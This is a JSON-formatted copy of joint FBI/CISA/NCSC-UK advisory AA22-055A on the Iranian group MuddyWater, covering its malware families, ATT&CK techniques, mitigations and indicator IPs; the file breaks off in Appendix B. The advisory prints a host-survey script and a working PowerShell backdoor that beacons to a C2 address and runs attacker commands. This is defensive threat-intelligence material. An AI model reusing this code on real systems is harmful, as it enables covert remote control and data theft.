@@ -1,0 +1,414 @@
+[
+ {
+  "id": "p1",
+  "text": "# Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA22-055A\n> - Date: 2022-02-24\n> - URL: https://www.ic3.gov/CSA/2022/220224.pdf\n> - PDF SHA-256: 6b6e337c122ef51a59b5a4bf900db9bfbe5e2d9e3087ffeabed15c741acb1fb8 (`source.pdf`, 18 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (35 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Co-Authored by:                                                                                  TLP:WHITE                Product ID: AA22-055A\n                                                                                                                             February 24, 2022"
+ },
+ {
+  "id": "p4",
+  "text": "Iranian Government-Sponsored Actors Conduct\n        Cyber Operations Against Global Government\n        and Commercial Networks\n        Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®)\n        framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques."
+ },
+ {
+  "id": "p5",
+  "text": "SUMMARY\n        The Federal Bureau of Investigation (FBI), the Cybersecurity                      Actions to Take Today to Protect\n        and Infrastructure Security Agency (CISA), the U.S. Cyber                            Against Malicious Activity\n        Command Cyber National Mission Force (CNMF), and the\n        United Kingdom’s National Cyber Security Centre (NCSC-                            •   Search for indicators of\n        UK) have observed a group of Iranian government-sponsored                             compromise.\n        advanced persistent threat (APT) actors, known as                                 •   Use antivirus software.\n        MuddyWater, conducting cyber espionage and other                                  •   Patch all systems.\n        malicious cyber operations targeting a range of government                        •   Prioritize patching known\n        and private-sector organizations across sectors—including                             exploited vulnerabilities.\n        telecommunications, defense, local government, and oil and                        •   Train users to recognize and\n        natural gas—in Asia, Africa, Europe, and North America.                               report phishing attempts.\n        Note: MuddyWater is also known as Earth Vetala,                                   •   Use multi-factor authentication.\n        MERCURY, Static Kitten, Seedworm, and TEMP.Zagros.\n        MuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security\n        (MOIS).[1] This APT group has conducted broad cyber campaigns in support of MOIS objectives\n        since approximately 2018. MuddyWater actors are positioned both to provide stolen data and\n        accesses to the Iranian government and to share these with other malicious cyber actors.\n        MuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools\n        and strategies to gain access to sensitive data on victims’ systems and deploy ransomware. These"
+ },
+ {
+  "id": "p6",
+  "text": "To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local\n        FBI field office at www.fbi.gov/contact-us/field-offices. When available, please include the following information regarding the\n        incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the\n        activity; the name of the submitting company or organization; and a designated point of contact. To request incident\n        response resources or technical assistance related to these threats, contact CISA at CISAServiceDesk@cisa.dhs.gov. For\n        NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at\n        Cybersecurity_Requests@nsa.gov. United Kingdom organizations should report a significant cyber security incident:\n        ncsc.gov.uk/report-an-incident (monitored 24 hours) or for urgent assistance call 03000 200 973.\n        This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries\n        minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to\n        standard copyright rules, TLP:WHITE information may be distributed without restriction.\n        For more information on the Traffic Light Protocol, see www.cisa.gov/tlp."
+ },
+ {
+  "id": "p7",
+  "text": "TLP:WHITE                                                                                        FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p8",
+  "text": "actors also maintain persistence on victim networks via tactics such as side-loading dynamic link\n       libraries (DLLs)—to trick legitimate programs into running malware—and obfuscating PowerShell\n       scripts to hide command and control (C2) functions. FBI, CISA, CNMF, and NCSC-UK have observed\n       MuddyWater actors recently using various malware—variants of PowGoop, Small Sieve, Canopy\n       (also known as Starwhale), Mori, and POWERSTATS—along with other tools as part of their\n       malicious activity.\n       This advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators\n       of compromise (IOCs) associated with this Iranian government-sponsored APT activity to aid\n       organizations in the identification of malicious activity against sensitive networks.\n       FBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations\n       apply the mitigations in this advisory and review the following resources for additional information.\n       Note: also see the Additional Resources section.\n           •    Malware Analysis Report – MAR-10369127.r1.v1: MuddyWater\n           •    IOCs – AA22-055A.stix and MAR-10369127.r1.v1.stix\n           •    CISA's webpage – Iran Cyber Threat Overview and Advisories\n           •    NCSC-UK MAR: Small Sieve\n           •    CNMF's press release – Iranian intel cyber suite of malware uses open source tools"
+ },
+ {
+  "id": "p9",
+  "text": "TECHNICAL DETAILS\n       FBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater\n       APT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple\n       open-source tools to gain access to sensitive government and commercial networks.\n       As part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into\n       downloading ZIP files, containing either an Excel file with a malicious macro that communicates with\n       the actor’s C2 server or a PDF file that drops a malicious file to the victim’s network [T1566.001,\n       T1204.002]. MuddyWater actors also use techniques such as side-loading DLLs [T1574.002] to trick\n       legitimate programs into running malware and obfuscating PowerShell scripts [T1059.001] to hide C2\n       functions [T1027] (see the PowGoop section for more information).\n       Additionally, the group uses multiple malware sets—including PowGoop, Small Sieve,\n       Canopy/Starwhale, Mori, and POWERSTATS—for loading malware, backdoor access, persistence\n       [TA0003], and exfiltration [TA0010]. See below for descriptions of some of these malware sets,\n       including newer tools or variants to the group’s suite. Additionally, see Malware Analysis Report MAR-\n       10369127.r1.v1: MuddyWater for further details."
+ },
+ {
+  "id": "p10",
+  "text": "PowGoop\n       MuddyWater actors use new variants of PowGoop malware as their main loader in malicious\n       operations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file\n       impersonates a legitimate file that is signed as a Google Update executable file."
+ },
+ {
+  "id": "p11",
+  "text": "TLP:WHITE                                                                                       FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p12",
+  "text": "According to samples of PowGoop analyzed by CISA and CNMF, PowGoop consists of three\n       components:\n           •    A DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading\n                technique [T1574.002]. The DLL file is contained within an executable, GoogleUpdate.exe.\n           •    A PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a\n                second obfuscated PowerShell script, config.txt [T1059.001].\n           •    config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded\n                IP address.\n       These components retrieve encrypted commands from a C2 server. The DLL file hides\n       communications with MuddyWater C2 servers by executing with the Google Update service."
+ },
+ {
+  "id": "p13",
+  "text": "Small Sieve\n       According to a sample analyzed by NCSC-UK, Small Sieve is a simple Python [T1059.006] backdoor\n       distributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS\n       installs the Python backdoor, index.exe, and adds it as a registry run key [T1547.001], enabling\n       persistence [TA0003].\n       MuddyWater disguises malicious executables and uses filenames and Registry key names\n       associated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT\n       group has also used variations of Microsoft (e.g., \"Microsift\") and Outlook in its filenames associated\n       with Small Sieve [T1036.005].\n       Small Sieve provides basic functionality required to maintain and expand a foothold in victim\n       infrastructure and avoid detection [TA0005] by using custom string and traffic obfuscation schemes\n       together with the Telegram Bot application programming interface (API). Specifically, Small Sieve’s\n       beacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure\n       (HTTPS) [T1071.001], and the tasking and beaconing data is obfuscated through a hex byte\n       swapping encoding scheme combined with an obfuscated Base64 function [T1027], T1132.002].\n       Note: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to\n       MuddyWater with high confidence.\n       See Appendix B for further analysis of Small Sieve malware."
+ },
+ {
+  "id": "p14",
+  "text": "Canopy\n       MuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with\n       targeted attachments [T1566.001]. According to two Canopy/Starwhale samples analyzed by CISA,\n       Canopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the\n       cybersecurity agencies of the United Kingdom and the United States attribute these malware samples\n       to MuddyWater with high confidence.\n       In the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros\n       written in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim"
+ },
+ {
+  "id": "p15",
+  "text": "TLP:WHITE                                                                                       FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p16",
+  "text": "opens the Excel file, they receive a prompt to enable macros [T1204.002]. Once this occurs, the\n       macros are executed, decoding and installing the two embedded Windows Script Files.\n       The first .wsf is installed in the current user startup folder [T1547.001] for persistence. The file\n       contains hexadecimal (hex)-encoded strings that have been reshuffled [T1027]. The file executes a\n       command to run the second .wsf.\n       The second .wsf also contains hex-encoded strings that have been reshuffled. This file collects\n       [TA0035] the victim system’s IP address, computer name, and username [T1005]. The collected data\n       is then hex-encoded and sent to an adversary-controlled IP address, http[:]88.119.170[.]124,\n       via an HTTP POST request [T1041]."
+ },
+ {
+  "id": "p17",
+  "text": "Mori\n       MuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate\n       with the group’s C2 infrastructure [T1572].\n       According to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is\n       executed with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component\n       to another program. FML.dll contains approximately 200MB of junk data [T1001.001] in a resource\n       directory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs\n       the following tasks:\n       •   Deletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with\n           a .old extension.\n       •   Resolves networking APIs from strings that are ADD-encrypted with the key 0x05.\n       •   Uses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the\n           JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their\n           results.\n       •   Communicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified\n           flag, for C2 [T1071.001].\n       •   Reads and/or writes data from the following Registry Keys, HKLM\\Software\\NFC\\IPA and\n           HKLM\\Software\\NFC\\(Default)."
+ },
+ {
+  "id": "p18",
+  "text": "POWERSTATS\n       This group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to\n       maintain persistent access to the victim systems [T1059.001].\n       CNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools—\n       along with JavaScript files used to establish connections back to malicious infrastructure—to the\n       malware aggregation tool and repository, Virus Total. Network operators who identify multiple\n       instances of the tools on the same network should investigate further as this may indicate the\n       presence of an Iranian malicious cyber actor.\n       MuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted\n       operations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the"
+ },
+ {
+  "id": "p19",
+  "text": "TLP:WHITE                                                                                     FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p20",
+  "text": "Microsoft Netlogon elevation of privilege vulnerability (CVE-2020-1472) and the Microsoft Exchange\n       memory corruption vulnerability (CVE-2020-0688). See CISA’s Known Exploited Vulnerabilities\n       Catalog for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: Iranian\n       Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities\n       for additional Iranian APT group-specific vulnerability exploits."
+ },
+ {
+  "id": "p21",
+  "text": "Survey Script\n       The following script is an example of a survey script used by MuddyWater to enumerate information\n       about victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain\n       information about the compromised machine to generate a string, with these fields separated by a\n       delimiter (e.g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant\n       and sent to an adversary-controlled IP address.\n       $O = Get-WmiObject Win32_OperatingSystem;$S = $O.Name;$S += \";;\";$ips = \"\";Get-\n       WmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | % {$ips =\n       $ips + \", \" + $_.IPAddress[0]};$S += $ips.substring(1);$S += \";;\";$S +=\n       $O.OSArchitecture;$S += \";;\";$S +=\n       [System.Net.DNS]::GetHostByName('').HostName;$S += \";;\";$S += ((Get-WmiObject\n       Win32_ComputerSystem).Domain);$S += \";;\";$S += $env:UserName;$S +=\n       \";;\";$AntiVirusProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class\n       AntiVirusProduct -ComputerName $env:computername;$resAnti =\n       @();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti +=\n       $AntiVirusProduct.displayName};$S += $resAnti;echo $S;"
+ },
+ {
+  "id": "p22",
+  "text": "Newly Identified PowerShell Backdoor\n       The newly identified PowerShell backdoor used by MuddyWater below uses a single-byte Exclusive-\n       OR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The\n       script is lightweight in functionality and uses the InvokeScript method to execute responses received\n       from the adversary.\n       function encode($txt,$key){$enByte =\n       [Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ;\n       $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt =\n       [Convert]::ToBase64String($enByte);return $encodetxt;}function\n       decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i\n       -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt =\n       [System.Text.Encoding]::UTF8.GetString($enByte);return\n       $dtxt;}$global:tt=20;while($true){try{$w =\n       [System.Net.HttpWebRequest]::Create('http[:]//95.181.161[.]49:80/index.php?id=<vi\n       ctim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(New-\n       Object\n       System.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.L\n       ength -gt 0){$res=[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode\n       $r 2));$wr ="
+ },
+ {
+  "id": "p23",
+  "text": "TLP:WHITE                                                                                    FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p24",
+  "text": "[System.Net.HttpWebRequest]::Create('http[:]//95.181.161[.]49:80/index.php?id=<vi\n       ctim identifier>');$wr.proxy =\n       [Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res\n       2));$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds\n       $global:tt;}"
+ },
+ {
+  "id": "p25",
+  "text": "MITRE ATT&CK TECHNIQUES\n       MuddyWater uses the ATT&CK techniques listed in table 1.\n                                       Table 1: MuddyWater ATT&CK Techniques [2]"
+ },
+ {
+  "id": "p26",
+  "text": "Technique Title                    ID           Use"
+ },
+ {
+  "id": "p27",
+  "text": "Reconnaissance"
+ },
+ {
+  "id": "p28",
+  "text": "Gather Victim Identity             T1589.002 MuddyWater has specifically targeted government agency\n        Information: Email Addresses                 employees with spearphishing emails."
+ },
+ {
+  "id": "p29",
+  "text": "Resource Development"
+ },
+ {
+  "id": "p30",
+  "text": "Acquire Infrastructure: Web        T1583.006 MuddyWater has used file sharing services including\n        Services                                     OneHub to distribute tools.\n        Obtain Capabilities: Tool          T1588.002 MuddyWater has made use of legitimate\n                                                     tools ConnectWise and RemoteUtilities for access to target\n                                                     environments."
+ },
+ {
+  "id": "p31",
+  "text": "Initial Access"
+ },
+ {
+  "id": "p32",
+  "text": "Phishing: Spearphishing            T1566.001 MuddyWater has compromised third parties and used\n        Attachment                                   compromised accounts to send spearphishing emails with\n                                                     targeted attachments.\n        Phishing: Spearphishing Link       T1566.002 MuddyWater has sent targeted spearphishing emails with\n                                                     malicious links."
+ },
+ {
+  "id": "p33",
+  "text": "Execution"
+ },
+ {
+  "id": "p34",
+  "text": "Windows Management                 T1047        MuddyWater has used malware that leveraged Windows\n        Instrumentation                                 Management Instrumentation for execution and querying\n                                                        host information.\n        Command and Scripting              T1059.001 MuddyWater has used PowerShell for execution.\n        Interpreter: PowerShell"
+ },
+ {
+  "id": "p35",
+  "text": "TLP:WHITE                                                                                  FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p36",
+  "text": "Command and Scripting            1059.003    MuddyWater has used a custom tool for creating reverse\n        Interpreter: Windows                         shells.\n        Command Shell\n        Command and Scripting            T1059.005 MuddyWater has used Virtual Basic Script (VBS) files to\n        Interpreter: Visual Basic                  execute its POWERSTATS payload, as well as macros.\n        Command and Scripting            T1059.006 MuddyWater has used developed tools in Python\n        Interpreter: Python                        including Out1.\n        Command and Scripting            T1059.007 MuddyWater has used JavaScript files to execute\n        Interpreter: JavaScript                    its POWERSTATS payload.\n        Exploitation for Client          T1203       MuddyWater has exploited the Office vulnerability CVE-\n        Execution                                    2017-0199 for execution.\n        User Execution: Malicious Link   T1204.001 MuddyWater has distributed URLs in phishing emails that\n                                                   link to lure documents.\n        User Execution: Malicious File   T1204.002 MuddyWater has attempted to get users to enable macros\n                                                   and launch malicious Microsoft Word documents delivered\n                                                   via spearphishing emails.\n        Inter-Process                    T1559.001 MuddyWater has used malware that has the capability to\n        Communication: Component                   execute malicious code via COM, DCOM, and Outlook.\n        Object Model\n        Inter-Process                    T1559.002 MuddyWater has used malware that can execute\n        Communication: Dynamic                     PowerShell scripts via Dynamic Data Exchange.\n        Data Exchange"
+ },
+ {
+  "id": "p37",
+  "text": "Persistence"
+ },
+ {
+  "id": "p38",
+  "text": "Scheduled                        T1053.005 MuddyWater has used scheduled tasks to establish\n        Task/Job: Scheduled Task                   persistence.\n        Office Application               T1137.001 MuddyWater has used a Word Template, Normal.dotm,\n        Startup: Office Template                   for persistence.\n        Macros\n        Boot or Logon Autostart          T1547.001 MuddyWater has added Registry Run key\n        Execution: Registry Run Keys               KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\R\n        / Startup Folder                           un\\SystemTextEncoding to establish persistence."
+ },
+ {
+  "id": "p39",
+  "text": "Privilege Escalation"
+ },
+ {
+  "id": "p40",
+  "text": "TLP:WHITE                                                                                   FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p41",
+  "text": "Abuse Elevation Control        T1548.002 MuddyWater uses various techniques to bypass user\n        Mechanism: Bypass User                   account control.\n        Account Control\n        Credentials from Password      T1555       MuddyWater has performed credential dumping\n        Stores                                     with LaZagne and other tools, including by dumping\n                                                   passwords saved in victim email.\n        Credentials from Web           T1555.003 MuddyWater has run tools including Browser64 to steal\n        Browsers                                 passwords saved in victim web browsers."
+ },
+ {
+  "id": "p42",
+  "text": "Defense Evasion"
+ },
+ {
+  "id": "p43",
+  "text": "Obfuscated Files or            T1027       MuddyWater has used Daniel Bohannon’s Invoke-\n        Information                                Obfuscation framework and obfuscated PowerShell\n                                                   scripts. The group has also used other obfuscation\n                                                   methods, including Base64 obfuscation of VBScripts and\n                                                   PowerShell commands.\n        Steganography                  T1027.003 MuddyWater has stored obfuscated JavaScript code in an\n                                                 image file named temp.jpg.\n        Compile After Delivery         T1027.004 MuddyWater has used the .NET csc.exe tool to compile\n                                                 executables from downloaded C# code.\n        Masquerading: Match            T1036.005 MuddyWater has disguised malicious executables and\n        Legitimate Name or Location              used filenames and Registry key names associated with\n                                                 Windows Defender. E.g., Small Sieve uses variations of\n                                                 Microsoft (Microsift) and Outlook in its filenames to attempt\n                                                 to avoid detection during casual inspection.\n        Deobfuscate/Decode Files or    T1140       MuddyWater decoded Base64-encoded PowerShell\n        Information                                commands using a VBS file.\n        Signed Binary Proxy            T1218.003 MuddyWater has used CMSTP.exe and a malicious .INF\n        Execution: CMSTP                         file to execute its POWERSTATS payload.\n        Signed Binary Proxy            T1218.005 MuddyWater has used mshta.exe to execute\n        Execution: Mshta                         its POWERSTATS payload and to pass a PowerShell one-\n                                                 liner for execution.\n        Signed Binary Proxy            T1218.011 MuddyWater has used malware that leveraged\n        Execution: Rundll32                      rundll32.exe in a Registry Run key to execute a .dll.\n        Execution Guardrails           T1480       The Small Sieve payload used by MuddyWater will only\n                                                   execute correctly if the word “Platypus” is passed to it on\n                                                   the command line."
+ },
+ {
+  "id": "p44",
+  "text": "TLP:WHITE                                                                                 FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p45",
+  "text": "Impair Defenses: Disable or    T1562.001 MuddyWater can disable the system's local proxy settings.\n        Modify Tools"
+ },
+ {
+  "id": "p46",
+  "text": "Credential Access"
+ },
+ {
+  "id": "p47",
+  "text": "OS Credential                  T1003.001 MuddyWater has performed credential dumping\n        Dumping: LSASS Memory                    with Mimikatz and procdump64.exe."
+ },
+ {
+  "id": "p48",
+  "text": "OS Credential Dumping: LSA     T1003.004 MuddyWater has performed credential dumping\n        Secrets                                  with LaZagne.\n        OS Credential                  T1003.005 MuddyWater has performed credential dumping\n        Dumping: Cached Domain                   with LaZagne.\n        Credentials\n        Unsecured                      T1552.001 MuddyWater has run a tool that steals passwords saved in\n        Credentials: Credentials In              victim email.\n        Files"
+ },
+ {
+  "id": "p49",
+  "text": "Discovery"
+ },
+ {
+  "id": "p50",
+  "text": "System Network Configuration   T1016       MuddyWater has used malware to collect the victim’s IP\n        Discovery                                  address and domain name.\n        System Owner/User Discovery    T1033       MuddyWater has used malware that can collect the\n                                                   victim’s username.\n        System Network Connections     T1049       MuddyWater has used a PowerShell backdoor to check for\n        Discovery                                  Skype connections on the target machine.\n        Process Discovery              T1057       MuddyWater has used malware to obtain a list of running\n                                                   processes on the system."
+ },
+ {
+  "id": "p51",
+  "text": "System Information Discovery   T1082       MuddyWater has used malware that can collect the\n                                                   victim’s OS version and machine name.\n        File and Directory Discovery   T1083       MuddyWater has used malware that checked if the\n                                                   ProgramData folder had folders or files with the keywords\n                                                   \"Kasper,\" \"Panda,\" or \"ESET.\"\n        Account Discovery: Domain      T1087.002 MuddyWater has used cmd.exe net user/domain to\n        Account                                  enumerate domain users.\n        Software Discovery             T1518       MuddyWater has used a PowerShell backdoor to check for\n                                                   Skype connectivity on the target machine."
+ },
+ {
+  "id": "p52",
+  "text": "TLP:WHITE                                                                                   FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p53",
+  "text": "Security Software Discovery     T1518.001 MuddyWater has used malware to check running\n                                                  processes against a hard-coded list of security tools often\n                                                  used by malware researchers."
+ },
+ {
+  "id": "p54",
+  "text": "Collection"
+ },
+ {
+  "id": "p55",
+  "text": "Screen Capture                  T1113       MuddyWater has used malware that can capture\n                                                    screenshots of the victim’s machine."
+ },
+ {
+  "id": "p56",
+  "text": "Archive Collected               T1560.001 MuddyWater has used the native Windows cabinet\n        Data: Archive via Utility                 creation tool, makecab.exe, likely to compress stolen data\n                                                  to be uploaded."
+ },
+ {
+  "id": "p57",
+  "text": "Command and Control"
+ },
+ {
+  "id": "p58",
+  "text": "Application Layer               T1071.001 MuddyWater has used HTTP for C2 communications. e.g.,\n        Protocol: Web Protocols                   Small Sieve beacons and tasking are performed using the\n                                                  Telegram API over HTTPS.\n        Proxy: External Proxy           T1090.002 MuddyWater has controlled POWERSTATS from behind a\n                                                  proxy network to obfuscate the C2 location.\n                                                    MuddyWater has used a series of compromised websites\n                                                    that victims connected to randomly to relay information to\n                                                    C2.\n        Web Service: Bidirectional      T1102.002 MuddyWater has used web services including OneHub to\n        Communication                             distribute remote access tools.\n        Multi-Stage Channels            T1104       MuddyWater has used one C2 to obtain enumeration\n                                                    scripts and monitor web logs, but a different C2 to send\n                                                    data back.\n        Ingress Tool Transfer           T1105       MuddyWater has used malware that can upload additional\n                                                    files to the victim’s machine."
+ },
+ {
+  "id": "p59",
+  "text": "Data Encoding: Standard         T1132.001 MuddyWater has used tools to encode C2\n        Encoding                                  communications including Base64 encoding.\n        Data Encoding: Non-Standard     T1132.002 MuddyWater uses tools such as Small Sieve, which\n        Encoding                                  employs a custom hex byte swapping encoding scheme to\n                                                  obfuscate tasking traffic.\n        Remote Access Software          T1219       MuddyWater has used a legitimate application,\n                                                    ScreenConnect, to manage systems remotely and move\n                                                    laterally."
+ },
+ {
+  "id": "p60",
+  "text": "TLP:WHITE                                                                                         FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p61",
+  "text": "Exfiltration"
+ },
+ {
+  "id": "p62",
+  "text": "Exfiltration Over C2 Channel    T1041        MuddyWater has used C2 infrastructure to receive\n                                                        exfiltrated data."
+ },
+ {
+  "id": "p63",
+  "text": "MITIGATIONS\n       Protective Controls and Architecture\n       •     Deploy application control software to limit the applications and executable code that can\n             be run by users. Email attachments and files downloaded via links in emails often contain\n             executable code."
+ },
+ {
+  "id": "p64",
+  "text": "Identity and Access Management\n       •     Use multifactor authentication where possible, particularly for webmail, virtual private\n             networks, and accounts that access critical systems.\n       •     Limit the use of administrator privileges. Users who browse the internet, use email, and\n             execute code with administrator privileges make for excellent spearphishing targets because their\n             system—once infected—enables attackers to move laterally across the network, gain additional\n             accesses, and access highly sensitive information."
+ },
+ {
+  "id": "p65",
+  "text": "Phishing Protection\n       •     Enable antivirus and anti-malware software and update signature definitions in a timely\n             manner. Well-maintained antivirus software may prevent use of commonly deployed attacker\n             tools that are delivered via spearphishing.\n       •     Be suspicious of unsolicited contact via email or social media from any individual you do\n             not know personally. Do not click on hyperlinks or open attachments in these communications.\n       •     Consider adding an email banner to emails received from outside your organization and\n             disabling hyperlinks in received emails.\n       •     Train users through awareness and simulations to recognize and report phishing and\n             social engineering attempts. Identify and suspend access of user accounts exhibiting unusual\n             activity.\n       •     Adopt threat reputation services at the network device, operating system, application, and\n             email service levels. Reputation services can be used to detect or prevent low-reputation email\n             addresses, files, URLs, and IP addresses used in spearphishing attacks."
+ },
+ {
+  "id": "p66",
+  "text": "Vulnerability and Configuration Management\n       •     Install updates/patch operating systems, software, and firmware as soon as\n             updates/patches are released. Prioritize patching known exploited vulnerabilities."
+ },
+ {
+  "id": "p67",
+  "text": "TLP:WHITE                                                                                       FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p68",
+  "text": "ADDITIONAL RESOURCES\n           •    For more information on Iranian government-sponsored malicious cyber activity, see CISA's\n                webpage – Iran Cyber Threat Overview and Advisories and CNMF's press release – Iranian\n                intel cyber suite of malware uses open source tools.\n           •    For information and resources on protecting against and responding to ransomware, refer\n                to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware\n                resources and alerts.\n           •    The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the\n                United Kingdom, and the United States: Technical Approaches to Uncovering and\n                Remediating Malicious Activity provides additional guidance when hunting or investigating a\n                network and common mistakes to avoid in incident handling.\n           •    CISA offers a range of no-cost cyber hygiene services to help critical infrastructure\n                organizations assess, identify, and reduce their exposure to threats, including ransomware. By\n                requesting these services, organizations of any size could find ways to reduce their risk and\n                mitigate attack vectors.\n           •    The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to\n                $10 million for reports of foreign government malicious activity against U.S. critical\n                infrastructure. See the RFJ website for more information and how to report information\n                securely."
+ },
+ {
+  "id": "p69",
+  "text": "REFERENCES\n       [1] CNMF Article: Iranian Intel Cyber Suite of Malware Uses Open Source Tools\n       [2] MITRE ATT&CK: MuddyWater"
+ },
+ {
+  "id": "p70",
+  "text": "CAVEATS\n       The information you have accessed or received is being provided “as is” for informational purposes\n       only. The FBI, CISA, CNMF, and NSA do not endorse any commercial product or service, including\n       any subjects of analysis. Any reference to specific commercial products, processes, or services by\n       service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement,\n       recommendation, or favoring by the FBI, CISA, CNMF, or NSA."
+ },
+ {
+  "id": "p71",
+  "text": "PURPOSE\n       This document was developed by the FBI, CISA, CNMF, NCSC-UK, and NSA in furtherance of their\n       respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity\n       specifications and mitigations. This information may be shared broadly to reach all appropriate\n       stakeholders. The United States’ NSA agrees with this attribution and the details provided in this\n       report."
+ },
+ {
+  "id": "p72",
+  "text": "TLP:WHITE                                                                    FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p73",
+  "text": "APPENDIX A: IOCS\n       The following IP addresses are associated with MuddyWater activity:\n       5.199.133[.]149\n       45.142.213[.]17\n       45.142.212[.]61\n       45.153.231[.]104\n       46.166.129[.]159\n       80.85.158[.]49\n       87.236.212[.]22\n       88.119.170[.]124\n       88.119.171[.]213\n       89.163.252[.]232\n       95.181.161[.]49\n       95.181.161[.]50\n       164.132.237[.]65\n       185.25.51[.]108\n       185.45.192[.]228\n       185.117.75[.]34\n       185.118.164[.]21\n       185.141.27[.]143\n       185.141.27[.]248\n       185.183.96[.]7\n       185.183.96[.]44\n       192.210.191[.]188\n       192.210.226[.]128"
+ },
+ {
+  "id": "p74",
+  "text": "TLP:WHITE                                                                                         FBI | CISA | CNMF | NCSC-UK | NSA"
+ },
+ {
+  "id": "p75",
+  "text": "APPENDIX B: SMALL SIEVE\n       Note: the information contained in this appendix is from NCSC-UK analysis of a Small Sieve sample."
+ },
+ {
+  "id": "p76",
+  "text": "Metadata\n                                              Table 2: Gram_app.exe Metadata"
+ },
+ {
+  "id": "p77",
+  "text": "Filename                  gram_app.exe\n        Description               NSIS installer that installs and runs the index.exe backdoor and adds a\n                                  persistence registry key\n        Size                      16999598 bytes\n        MD5                       15fa3b32539d7453a9a85958b77d4c95\n        SHA-1                     11d594f3b3cf8525682f6214acb7b7782056d282\n        SHA-256                   b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054\n        Compile Time              2021-09-25 21:57:46 UTC"
+ },
+ {
+  "id": "p78",
+  "text": "Table 3: Index.exe Metadata"
+ },
+ {
+  "id": "p79",
